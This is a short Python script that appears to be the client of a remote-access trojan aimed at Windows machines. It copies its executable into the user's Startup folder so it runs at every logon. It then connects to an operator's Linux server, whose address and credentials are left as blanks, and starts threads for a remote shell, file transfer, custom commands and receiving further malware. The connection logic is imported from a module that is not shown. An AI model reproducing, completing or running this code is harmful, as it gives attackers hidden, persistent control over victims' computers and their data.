import threading
import time
import os
import sys
import shutil

from task_handler import TaskHandler

#================================================
# MAKE SURE TO FILL IN THESE VARIABLES
EXECUTABLE_NAME =         ""
LINUX_SERVER_IP_ADDRESS = ""
LINUX_SERVER_USERNAME =   ""
LINUX_SERVER_PASSWORD =   ""
#================================================

def copy_to_startup(dest_name: str) -> None:
    startup_path: str = os.path.join(
        os.getenv("APPDATA"),
        r"Microsoft/Windows/Start Menu/Programs/Startup",
    )
    dest_path: str = os.path.join(startup_path, dest_name)
    if not os.path.exists(dest_path):
        shutil.copyfile(dest_name, dest_path)
        os.startfile(dest_path)
    else:
        sys.exit()

def thread(target):
    threading.Thread(target=target).start()

client = TaskHandler(
    LINUX_SERVER_IP_ADDRESS,
    LINUX_SERVER_USERNAME,
    LINUX_SERVER_PASSWORD
)

copy_to_startup(EXECUTABLE_NAME)

client.client.connect()
client.copy_file()
thread(client.recv_shell)
time.sleep(4.9)
thread(client.stay_online)
thread(client.recv_file)
thread(client.recv_custom_cmd)
thread(client.recv_virus)
# client.client.close()